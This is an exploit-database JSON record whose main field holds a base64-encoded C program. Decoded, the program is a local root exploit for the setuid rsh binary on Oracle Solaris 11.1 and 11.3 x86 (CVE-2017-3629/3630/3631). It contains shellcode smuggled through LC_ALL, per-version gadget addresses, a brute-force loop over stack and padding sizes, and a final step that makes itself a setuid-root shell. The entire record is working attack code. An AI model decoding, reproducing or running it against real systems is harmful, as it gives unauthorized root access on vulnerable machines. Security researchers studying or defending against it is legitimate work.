{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIFNvbGFyaXNfcnNoLmMgZm9yIENWRS0yMDE3LTM2MzAsIENWRS0yMDE3LTM2MjksIENWRS0yMDE3LTM2MzENCiAqIENvcHlyaWdodCAoQykgMjAxNyBRdWFseXMsIEluYy4NCiAqDQogKiBUaGlzIHByb2dyYW0gaXMgZnJlZSBzb2Z0d2FyZTogeW91IGNhbiByZWRpc3RyaWJ1dGUgaXQgYW5kL29yIG1vZGlmeQ0KICogaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSBhcyBwdWJsaXNoZWQgYnkNCiAqIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVpdGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yDQogKiAoYXQgeW91ciBvcHRpb24pIGFueSBsYXRlciB2ZXJzaW9uLg0KICoNCiAqIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLA0KICogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YNCiAqIE1FUkNIQU5UQUJJTElUWSBvciBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRS4gIFNlZSB0aGUNCiAqIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuDQogKg0KICogWW91IHNob3VsZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UNCiAqIGFsb25nIHdpdGggdGhpcyBwcm9ncmFtLiAgSWYgbm90LCBzZWUgPGh0dHA6Ly93d3cuZ251Lm9yZy9saWNlbnNlcy8+Lg0KICovDQoNCiNpbmNsdWRlIDxlcnJuby5oPg0KI2luY2x1ZGUgPGZjbnRsLmg+DQojaW5jbHVkZSA8c2lnbmFsLmg+DQojaW5jbHVkZSA8c3RkaW50Lmg+DQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzeXMvZmNudGwuaD4NCiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KI2lmbmRlZiB0aW1lcnN1Yg0KI2RlZmluZSB0aW1lcnN1YihhLCBiLCByZXN1bHQpIFwNCiAgICBkbyB7IFwNCiAgICAgICAgKHJlc3VsdCktPnR2X3NlYyA9IChhKS0+dHZfc2VjIC0gKGIpLT50dl9zZWM7IFwNCiAgICAgICAgKHJlc3VsdCktPnR2X3VzZWMgPSAoYSktPnR2X3VzZWMgLSAoYiktPnR2X3VzZWM7IFwNCiAgICAgICAgaWYgKChyZXN1bHQpLT50dl91c2VjIDwgMCkgeyBcDQogICAgICAgICAgICAtLShyZXN1bHQpLT50dl9zZWM7IFwNCiAgICAgICAgICAgIChyZXN1bHQpLT50dl91c2VjICs9IDEwMDAwMDA7IFwNCiAgICAgICAgfSBcDQogICAgfSB3aGlsZSAoMCkNCiNlbmRpZg0KDQojZGVmaW5lIFJTSCAiL3Vzci9iaW4vcnNoIg0Kc3RhdGljIGNvbnN0IHN0cnVjdCB0YXJnZXQgKiB0YXJnZXQ7DQpzdGF0aWMgY29uc3Qgc3RydWN0IHRhcmdldCB7DQogICAgY29uc3QgY2hhciAqIG5hbWU7DQogICAgc2l6ZV90IHNfZmlyc3QsIHNfbGFzdCwgc19zdGVwOw0KICAgIHNpemVfdCBsX2ZpcnN0LCBsX2xhc3QsIGxfc3RlcDsNCiAgICBzaXplX3QgcF9maXJzdCwgcF9sYXN0LCBwX3N0ZXA7DQogICAgc2l6ZV90IGEsIGI7DQogICAgc2l6ZV90IGksIGo7DQp9IHRhcmdldHNbXSA9IHsNCiAgICB7DQogICAgICAgIC5uYW1lID0gIk9yYWNsZSBTb2xhcmlzIDExLjEgWDg2IChBc3NlbWJsZWQgMTkgU2VwdGVtYmVyIDIwMTIpIiwNCiAgICAgICAgLnNfZmlyc3QgPSAxNioxMDI0LCAuc19sYXN0ID0gNDQqMTAyNCwgLnNfc3RlcCA9IDQwOTYsDQogICAgICAgIC5sX2ZpcnN0ID0gMTkyLCAgICAgLmxfbGFzdCA9IDUxMiwgICAgIC5sX3N0ZXAgPSAxNiwNCiAgICAgICAgLnBfZmlyc3QgPSAwLCAgICAgICAucF9sYXN0ID0gODE5MiwgICAgLnBfc3RlcCA9IDEsDQogICAgICAgIC5hID0gMCwgICAgICAgICAgICAgLmIgPSAxNSwgICAgICAgICAgIC5qID0gMTIsDQogICAgICAgIC5pID0gMHgwODA1MjYwOCAvKiBwb3AgZWR4OyBwb3AgZWJwOyByZXQgKi8NCiAgICB9LA0KICAgIHsNCiAgICAgICAgLm5hbWUgPSAiT3JhY2xlIFNvbGFyaXMgMTEuMyBYODYgKEFzc2VtYmxlZCAwNiBPY3RvYmVyIDIwMTUpIiwNCiAgICAgICAgLnNfZmlyc3QgPSAxMioxMDI0LCAuc19sYXN0ID0gNDQqMTAyNCwgLnNfc3RlcCA9IDQwOTYsDQogICAgICAgIC5sX2ZpcnN0ID0gOTYsICAgICAgLmxfbGFzdCA9IDUxMiwgICAgIC5sX3N0ZXAgPSA0LA0KICAgICAgICAucF9maXJzdCA9IDAsICAgICAgIC5wX2xhc3QgPSA0MDk2LCAgICAucF9zdGVwID0gNCwNCiAgICAgICAgLmEgPSAwLCAgICAgICAgICAgICAuYiA9IDMsICAgICAgICAgICAgLmogPSBTSVpFX01BWCwNCiAgICAgICAgLmkgPSAweDA3ZmFhN2VhIC8qIGNhbGwgKjB4YyglZWJwKSAqLw0KICAgIH0sDQp9Ow0KDQojZGVmaW5lIFJPT1RTSEVMTCAiUk9PVCINCnN0YXRpYyBjb25zdCBjaGFyIHNoZWxsY29kZVtdID0NCiAgICAiXHgzMVx4YzBceDUwXHg2OFJPT1QiDQogICAgIlx4ODlceGUzXHg1MFx4NTNceDg5XHhlMlx4NTBceDUwIg0KICAgICJceDUyXHg1M1x4YjBceDNDXHg0OFx4NTBceGNkXHg5MSINCiAgICAiXHgzMVx4YzBceDQwXHg1MFx4NTBceGNkXHg5MVoiOw0KDQpzdGF0aWMgdm9sYXRpbGUgc2lnX2F0b21pY190IHNpZ2FsYXJtOw0KDQpzdGF0aWMgdm9pZA0Kc2lnYWxhcm1faGFuZGxlcihjb25zdCBpbnQgc2lnbnVtIF9fYXR0cmlidXRlX18oKF9fdW51c2VkX18pKSkNCnsNCiAgICBzaWdhbGFybSA9IDE7DQp9DQoNCiNkZWZpbmUgZGllKCkgZG8geyBcDQogICAgZnByaW50ZihzdGRlcnIsICJkaWVkIGluICVzOiAldVxuIiwgX19mdW5jX18sIF9fTElORV9fKTsgXA0KICAgIGV4aXQoRVhJVF9GQUlMVVJFKTsgXA0KfSB3aGlsZSAoMCkNCg0Kc3RhdGljIGludA0KaXNfc3VpZF9yb290KGNvbnN0IGNoYXIgKiBjb25zdCBmaWxlKQ0Kew0KICAgIGlmICghZmlsZSkgZGllKCk7DQogICAgc3RhdGljIHN0cnVjdCBzdGF0IHNidWY7DQogICAgaWYgKHN0YXQoZmlsZSwgJnNidWYpKSBkaWUoKTsNCiAgICBpZiAoIVNfSVNSRUcoc2J1Zi5zdF9tb2RlKSkgZGllKCk7DQogICAgcmV0dXJuICgoc2J1Zi5zdF91aWQgPT0gMCkgJiYgKHNidWYuc3RfbW9kZSAmIFNfSVNVSUQpKTsNCn0NCg0Kc3RhdGljIGNvbnN0IGNoYXIgKg0KYnVpbGRfbGNhKGNvbnN0IHNpemVfdCBsKQ0Kew0KICAgIHN0YXRpYyBjb25zdCBzaXplX3Qgc2hlbGxjb2RlX2xlbiA9IHNpemVvZihzaGVsbGNvZGUpLTE7DQogICAgaWYgKHNoZWxsY29kZV9sZW4gPiA2NCkgZGllKCk7DQogICAgaWYgKHNoZWxsY29kZV9sZW4gJSAxNikgZGllKCk7DQogICAgaWYgKGwgPCBzaGVsbGNvZGVfbGVuICsgdGFyZ2V0LT5hICsgdGFyZ2V0LT5iKSBkaWUoKTsNCg0KICAgICNkZWZpbmUgTENBX01BWCA0MDk2DQogICAgaWYgKGwgPiBMQ0FfTUFYKSBkaWUoKTsNCiAgICBzdGF0aWMgY2hhciBsY2FbMTI4ICsgTENBX01BWF07DQogICAgc3RyY3B5KGxjYSwgIkxDX0FMTD0iKTsNCiAgICBjaGFyICogY3AgPSBtZW1jaHIobGNhLCAnXDAnLCBzaXplb2YobGNhKSk7DQogICAgaWYgKCFjcCkgZGllKCk7DQogICAgbWVtY3B5KGNwLCBzaGVsbGNvZGUsIHNoZWxsY29kZV9sZW4pOw0KICAgIGNwICs9IHNoZWxsY29kZV9sZW47DQogICAgbWVtc2V0KGNwLCAnYScsIHRhcmdldC0+YSk7DQoNCiAgICBzaXplX3QgbzsNCiAgICBmb3IgKG8gPSB0YXJnZXQtPmE7IGwgLSBvID49IDQ7IG8gKz0gNCkgew0KICAgICAgICBpZiAoKG8gLSB0YXJnZXQtPmEpICUgMTYgPT0gdGFyZ2V0LT5qKSB7DQogICAgICAgICAgICBjcFtvICsgMF0gPSAnXHhlYic7DQogICAgICAgICAgICBjcFtvICsgMV0gPSAobyAtIHRhcmdldC0+YSA+PSAxNikgPyAtKDE2dSArIDJ1KSA6DQogICAgICAgICAgICAgICAgLShzaGVsbGNvZGVfbGVuICsgdGFyZ2V0LT5hICsgdGFyZ2V0LT5qICsgMik7DQogICAgICAgICAgICBjcFtvICsgMl0gPSAnaic7DQogICAgICAgICAgICBjcFtvICsgM10gPSAnaic7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoc2l6ZW9mKHNpemVfdCkgIT0gNCkgZGllKCk7DQogICAgICAgICAgICAqKHNpemVfdCAqKShjcCArIG8pID0gdGFyZ2V0LT5pOw0KICAgICAgICB9DQogICAgfQ0KICAgIGNwICs9IG87DQogICAgbWVtc2V0KGNwLCAnYicsIHRhcmdldC0+Yik7DQogICAgY3BbdGFyZ2V0LT5iXSA9ICdcMCc7DQogICAgaWYgKHN0cmxlbihsY2EpICE9IDcgKyBzaGVsbGNvZGVfbGVuICsgbyArIHRhcmdldC0+YikgZGllKCk7DQogICAgcmV0dXJuIGxjYTsNCn0NCg0Kc3RhdGljIGNvbnN0IGNoYXIgKg0KYnVpbGRfcGFkKGNvbnN0IHNpemVfdCBwKQ0Kew0KICAgICNkZWZpbmUgUEFEX01BWCA4MTkyDQogICAgaWYgKHAgPiBQQURfTUFYKSBkaWUoKTsNCiAgICBzdGF0aWMgY2hhciBwYWRbNjQgKyBQQURfTUFYXTsNCiAgICBzdHJjcHkocGFkLCAiUD0iKTsNCiAgICBjaGFyICogY29uc3QgY3AgPSBtZW1jaHIocGFkLCAnXDAnLCBzaXplb2YocGFkKSk7DQogICAgaWYgKCFjcCkgZGllKCk7DQogICAgbWVtc2V0KGNwLCAncCcsIHApOw0KICAgIGNwW3BdID0gJ1wwJzsNCiAgICBpZiAoc3RybGVuKHBhZCkgIT0gMiArIHApIGRpZSgpOw0KICAgIHJldHVybiBwYWQ7DQp9DQoNCnN0YXRpYyB2b2lkDQpmb3JrX3dvcmtlcihjb25zdCBzaXplX3QgcywgY29uc3QgY2hhciAqIGNvbnN0IGxjYSwgY29uc3QgY2hhciAqIGNvbnN0IHBhZCkNCnsNCiAgICAjZGVmaW5lIE5fV09SS0VSUyAyDQogICAgc3RhdGljIHNpemVfdCBuX3dvcmtlcnM7DQogICAgc3RhdGljIHN0cnVjdCB7DQogICAgICAgIHBpZF90IHBpZDsNCiAgICAgICAgc3RydWN0IHRpbWV2YWwgc3RhcnQ7DQogICAgfSB3b3JrZXJzW05fV09SS0VSU107DQoNCiAgICBzaXplX3QgaV93b3JrZXI7DQogICAgc3RydWN0IHRpbWV2YWwgc3RhcnQsIHN0b3AsIGRpZmY7DQoNCiAgICBpZiAobl93b3JrZXJzID49IE5fV09SS0VSUykgew0KICAgICAgICBpZiAobl93b3JrZXJzICE9IE5fV09SS0VSUykgZGllKCk7DQogICAgICAgIGludCBpc19zdWlkX3Jvb3RzaGVsbCA9IDA7DQogICAgICAgIGZvciAoOzspIHsNCiAgICAgICAgICAgIHNpZ2FsYXJtID0gMDsNCiAgICAgICAgICAgICNkZWZpbmUgVElNRU9VVCAxMA0KICAgICAgICAgICAgYWxhcm0oVElNRU9VVCk7DQogICAgICAgICAgICBpbnQgc3RhdHVzID0gMDsNCiAgICAgICAgICAgIGNvbnN0IHBpZF90IHBpZCA9IHdhaXRwaWQoLTEsICZzdGF0dXMsIFdVTlRSQUNFRCk7DQogICAgICAgICAgICBhbGFybSgwKTsNCiAgICAgICAgICAgIGlmIChnZXR0aW1lb2ZkYXkoJnN0b3AsIE5VTEwpKSBkaWUoKTsNCg0KICAgICAgICAgICAgaWYgKHBpZCA8PSAwKSB7DQogICAgICAgICAgICAgICAgaWYgKHBpZCAhPSAtMSkgZGllKCk7DQogICAgICAgICAgICAgICAgaWYgKGVycm5vICE9IEVJTlRSKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBpZiAoc2lnYWxhcm0gIT0gMSkgZGllKCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpbnQgZm91bmRfcGlkID0gMDsNCiAgICAgICAgICAgIGZvciAoaV93b3JrZXIgPSAwOyBpX3dvcmtlciA8IE5fV09SS0VSUzsgaV93b3JrZXIrKykgew0KICAgICAgICAgICAgICAgIGNvbnN0IHBpZF90IHdvcmtlcl9waWQgPSB3b3JrZXJzW2lfd29ya2VyXS5waWQ7DQogICAgICAgICAgICAgICAgaWYgKHdvcmtlcl9waWQgPD0gMCkgZGllKCk7DQogICAgICAgICAgICAgICAgaWYgKHdvcmtlcl9waWQgPT0gcGlkKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChmb3VuZF9waWQpIGRpZSgpOw0KICAgICAgICAgICAgICAgICAgICBmb3VuZF9waWQgPSAxOw0KICAgICAgICAgICAgICAgICAgICBpZiAoV0lGRVhJVEVEKHN0YXR1cykgfHwgV0lGU0lHTkFMRUQoc3RhdHVzKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmtlcnNbaV93b3JrZXJdLnBpZCA9IDA7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgdGltZXJzdWIoJnN0b3AsICZ3b3JrZXJzW2lfd29ya2VyXS5zdGFydCwgJmRpZmYpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoZGlmZi50dl9zZWMgPj0gVElNRU9VVCkNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChraWxsKHdvcmtlcl9waWQsIFNJR0tJTEwpKSBkaWUoKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoIWZvdW5kX3BpZCkgew0KICAgICAgICAgICAgICAgIGlmIChwaWQgIT0gLTEpIGRpZSgpOw0KICAgICAgICAgICAgICAgIGNvbnRpbnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKFdJRkVYSVRFRChzdGF0dXMpKSB7DQogICAgICAgICAgICAgICAgaWYgKFdFWElUU1RBVFVTKHN0YXR1cykgIT0gRVhJVF9GQUlMVVJFKQ0KICAgICAgICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgImV4aXRlZCAlZFxuIiwgV0VYSVRTVEFUVVMoc3RhdHVzKSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9IGVsc2UgaWYgKFdJRlNJR05BTEVEKHN0YXR1cykpIHsNCiAgICAgICAgICAgICAgICBpZiAoV1RFUk1TSUcoc3RhdHVzKSAhPSBTSUdTRUdWKQ0KICAgICAgICAgICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgInNpZ25hbCAlZFxuIiwgV1RFUk1TSUcoc3RhdHVzKSk7DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9IGVsc2UgaWYgKFdJRlNUT1BQRUQoc3RhdHVzKSkgew0KICAgICAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAic3RvcHBlZCAlZFxuIiwgV1NUT1BTSUcoc3RhdHVzKSk7DQogICAgICAgICAgICAgICAgaXNfc3VpZF9yb290c2hlbGwgfD0gaXNfc3VpZF9yb290KFJPT1RTSEVMTCk7DQogICAgICAgICAgICAgICAgaWYgKGtpbGwocGlkLCBTSUdLSUxMKSkgZGllKCk7DQogICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmcHJpbnRmKHN0ZGVyciwgInVua25vd24gJWRcbiIsIHN0YXR1cyk7DQogICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoaXNfc3VpZF9yb290c2hlbGwpIHsNCiAgICAgICAgICAgIHN5c3RlbSgibHMgLWxMICIgUk9PVFNIRUxMKTsNCiAgICAgICAgICAgIGV4aXQoRVhJVF9TVUNDRVNTKTsNCiAgICAgICAgfQ0KICAgICAgICBuX3dvcmtlcnMtLTsNCiAgICB9DQogICAgaWYgKG5fd29ya2VycyA+PSBOX1dPUktFUlMpIGRpZSgpOw0KDQogICAgc3RhdGljIGNoYXIgcnNoX2xpbmtbNjRdOw0KICAgIGlmICgqcnNoX2xpbmsgIT0gJy8nKSB7DQogICAgICAgIGNvbnN0IGludCByc2hfZmQgPSBvcGVuKFJTSCwgT19SRE9OTFkpOw0KICAgICAgICBpZiAocnNoX2ZkIDw9IFNUREVSUl9GSUxFTk8pIGRpZSgpOw0KICAgICAgICBpZiAoKHVuc2lnbmVkIGludClzbnByaW50Zihyc2hfbGluaywgc2l6ZW9mKHJzaF9saW5rKSwNCiAgICAgICAgICAgICIvcHJvYy8lbGQvZmQvJWQiLCAobG9uZylnZXRwaWQoKSwgcnNoX2ZkKSA+PSBzaXplb2YocnNoX2xpbmspKSBkaWUoKTsNCiAgICAgICAgaWYgKGFjY2Vzcyhyc2hfbGluaywgUl9PSyB8IFhfT0spKSBkaWUoKTsNCiAgICAgICAgaWYgKCpyc2hfbGluayAhPSAnLycpIGRpZSgpOw0KICAgIH0NCg0KICAgIHN0YXRpYyBpbnQgbnVsbF9mZCA9IC0xOw0KICAgIGlmIChudWxsX2ZkIDw9IC0xKSB7DQogICAgICAgIG51bGxfZmQgPSBvcGVuKCIvZGV2L251bGwiLCBPX1JEV1IpOw0KICAgICAgICBpZiAobnVsbF9mZCA8PSAtMSkgZGllKCk7DQogICAgfQ0KDQogICAgY29uc3QgcGlkX3QgcGlkID0gZm9yaygpOw0KICAgIGlmIChwaWQgPD0gLTEpIGRpZSgpOw0KICAgIGlmIChwaWQgPT0gMCkgew0KICAgICAgICBjb25zdCBzdHJ1Y3QgcmxpbWl0IHN0YWNrID0geyBzLCBzIH07DQogICAgICAgIGlmIChzZXRybGltaXQoUkxJTUlUX1NUQUNLLCAmc3RhY2spKSBkaWUoKTsNCg0KICAgICAgICBpZiAoZHVwMihudWxsX2ZkLCBTVERJTl9GSUxFTk8pICE9IFNURElOX0ZJTEVOTykgZGllKCk7DQogICAgICAgIGlmIChkdXAyKG51bGxfZmQsIFNURE9VVF9GSUxFTk8pICE9IFNURE9VVF9GSUxFTk8pIGRpZSgpOw0KICAgICAgICBpZiAoZHVwMihudWxsX2ZkLCBTVERFUlJfRklMRU5PKSAhPSBTVERFUlJfRklMRU5PKSBkaWUoKTsNCg0KICAgICAgICBzdGF0aWMgY2hhciAqIGNvbnN0IGFyZ3ZbXSA9IHsgcnNoX2xpbmssICItPyIsIE5VTEwgfTsNCiAgICAgICAgY2hhciAqIGNvbnN0IGVudnBbXSA9IHsgKGNoYXIgKilsY2EsIChjaGFyICopcGFkLCBOVUxMIH07DQogICAgICAgIGV4ZWN2ZSgqYXJndiwgYXJndiwgZW52cCk7DQogICAgICAgIGRpZSgpOw0KICAgIH0NCiAgICBpZiAoZ2V0dGltZW9mZGF5KCZzdGFydCwgTlVMTCkpIGRpZSgpOw0KICAgIGZvciAoaV93b3JrZXIgPSAwOyBpX3dvcmtlciA8IE5fV09SS0VSUzsgaV93b3JrZXIrKykgew0KICAgICAgICBjb25zdCBwaWRfdCB3b3JrZXJfcGlkID0gd29ya2Vyc1tpX3dvcmtlcl0ucGlkOw0KICAgICAgICBpZiAod29ya2VyX3BpZCA+IDApIGNvbnRpbnVlOw0KICAgICAgICBpZiAod29ya2VyX3BpZCAhPSAwKSBkaWUoKTsNCiAgICAgICAgd29ya2Vyc1tpX3dvcmtlcl0ucGlkID0gcGlkOw0KICAgICAgICB3b3JrZXJzW2lfd29ya2VyXS5zdGFydCA9IHN0YXJ0Ow0KICAgICAgICBuX3dvcmtlcnMrKzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICBkaWUoKTsNCn0NCg0KaW50DQptYWluKGNvbnN0IGludCBhcmdjLCBjb25zdCBjaGFyICogY29uc3QgYXJndltdKQ0Kew0KICAgIHN0YXRpYyBjb25zdCBzdHJ1Y3QgcmxpbWl0IGNvcmU7DQogICAgaWYgKHNldHJsaW1pdChSTElNSVRfQ09SRSwgJmNvcmUpKSBkaWUoKTsNCg0KICAgIGlmIChnZXRldWlkKCkgPT0gMCkgew0KICAgICAgICBpZiAoaXNfc3VpZF9yb290KFJPT1RTSEVMTCkpIHsNCiAgICAgICAgICAgIGlmIChzZXR1aWQoMCkpIGRpZSgpOw0KICAgICAgICAgICAgaWYgKHNldGdpZCgwKSkgZGllKCk7DQogICAgICAgICAgICBzdGF0aWMgY2hhciAqIGNvbnN0IGFyZ3ZbXSA9IHsgIi9iaW4vc2giLCBOVUxMIH07DQogICAgICAgICAgICBleGVjdmUoKmFyZ3YsIGFyZ3YsIE5VTEwpOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICAgICAgY2hvd24oKmFyZ3YsIDAsIDApOw0KICAgICAgICBjaG1vZCgqYXJndiwgMDQ1NTUpOw0KICAgICAgICBmb3IgKDs7KSB7DQogICAgICAgICAgICByYWlzZShTSUdTVE9QKTsNCiAgICAgICAgICAgIHNsZWVwKDEpOw0KICAgICAgICB9DQogICAgICAgIGRpZSgpOw0KICAgIH0NCiAgICBpZiAoc3ltbGluaygqYXJndiwgUk9PVFNIRUxMKSkgew0KICAgICAgICBpZiAoZXJybm8gIT0gRUVYSVNUKSBkaWUoKTsNCiAgICB9DQoNCiAgICBpZiAoYXJnYyAhPSAyKSB7DQogICAgICAgIGZwcmludGYoc3RkZXJyLCAiVXNhZ2U6ICVzIHRhcmdldFxuIiwgKmFyZ3YpOw0KICAgICAgICBzaXplX3QgaTsNCiAgICAgICAgZm9yIChpID0gMDsgaSA8IHNpemVvZih0YXJnZXRzKS9zaXplb2YoKnRhcmdldHMpOyBpKyspIHsNCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAiVGFyZ2V0ICV6dSAlc1xuIiwgaSwgdGFyZ2V0c1tpXS5uYW1lKTsNCiAgICAgICAgfQ0KICAgICAgICBkaWUoKTsNCiAgICB9DQogIHsNCiAgICBjb25zdCBzaXplX3QgaSA9IHN0cnRvdWwoYXJndlsxXSwgTlVMTCwgMTApOw0KICAgIGlmIChpID49IHNpemVvZih0YXJnZXRzKS9zaXplb2YoKnRhcmdldHMpKSBkaWUoKTsNCiAgICB0YXJnZXQgPSB0YXJnZXRzICsgaTsNCiAgICBmcHJpbnRmKHN0ZGVyciwgIlRhcmdldCAlenUgJXNcbiIsIGksIHRhcmdldC0+bmFtZSk7DQogIH0NCiAgICBpZiAodGFyZ2V0LT5hID49IDE2KSBkaWUoKTsNCiAgICBpZiAodGFyZ2V0LT5iID49IDE2KSBkaWUoKTsNCiAgICBpZiAodGFyZ2V0LT5pIDw9IDApIGRpZSgpOw0KICAgIGlmICh0YXJnZXQtPmogPj0gMTYgfHwgdGFyZ2V0LT5qICUgNCkgew0KICAgICAgICBpZiAodGFyZ2V0LT5qICE9IFNJWkVfTUFYKSBkaWUoKTsNCiAgICB9DQoNCiAgICBzdGF0aWMgY29uc3Qgc3RydWN0IHNpZ2FjdGlvbiBzaWdhbGFybV9hY3Rpb24gPSB7IC5zYV9oYW5kbGVyID0gc2lnYWxhcm1faGFuZGxlciB9Ow0KICAgIGlmIChzaWdhY3Rpb24oU0lHQUxSTSwgJnNpZ2FsYXJtX2FjdGlvbiwgTlVMTCkpIGRpZSgpOw0KDQogICAgc2l6ZV90IHM7DQogICAgZm9yIChzID0gdGFyZ2V0LT5zX2ZpcnN0OyBzIDw9IHRhcmdldC0+c19sYXN0OyBzICs9IHRhcmdldC0+c19zdGVwKSB7DQogICAgICAgIGlmIChzICUgdGFyZ2V0LT5zX3N0ZXApIGRpZSgpOw0KDQogICAgICAgIHNpemVfdCBsOw0KICAgICAgICBmb3IgKGwgPSB0YXJnZXQtPmxfZmlyc3Q7IGwgPD0gdGFyZ2V0LT5sX2xhc3Q7IGwgKz0gdGFyZ2V0LT5sX3N0ZXApIHsNCiAgICAgICAgICAgIGlmIChsICUgdGFyZ2V0LT5sX3N0ZXApIGRpZSgpOw0KICAgICAgICAgICAgY29uc3QgY2hhciAqIGNvbnN0IGxjYSA9IGJ1aWxkX2xjYShsKTsNCiAgICAgICAgICAgIGZwcmludGYoc3RkZXJyLCAicyAlenUgbCAlenVcbiIsIHMsIGwpOw0KDQogICAgICAgICAgICBzaXplX3QgcDsNCiAgICAgICAgICAgIGZvciAocCA9IHRhcmdldC0+cF9maXJzdDsgcCA8PSB0YXJnZXQtPnBfbGFzdDsgcCArPSB0YXJnZXQtPnBfc3RlcCkgew0KICAgICAgICAgICAgICAgIGlmIChwICUgdGFyZ2V0LT5wX3N0ZXApIGRpZSgpOw0KICAgICAgICAgICAgICAgIGNvbnN0IGNoYXIgKiBjb25zdCBwYWQgPSBidWlsZF9wYWQocCk7DQogICAgICAgICAgICAgICAgZm9ya193b3JrZXIocywgbGNhLCBwYWQpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGZwcmludGYoc3RkZXJyLCAiUGxlYXNlIHRyeSBhZ2FpblxuIik7DQogICAgZGllKCk7DQp9", 
    "filename": "platforms/solaris_x86/local/42270.c", 
    "id": "42270", 
    "cves": [
        "CVE-2017-3631", 
        "CVE-2017-3630", 
        "CVE-2017-3629"
    ]
}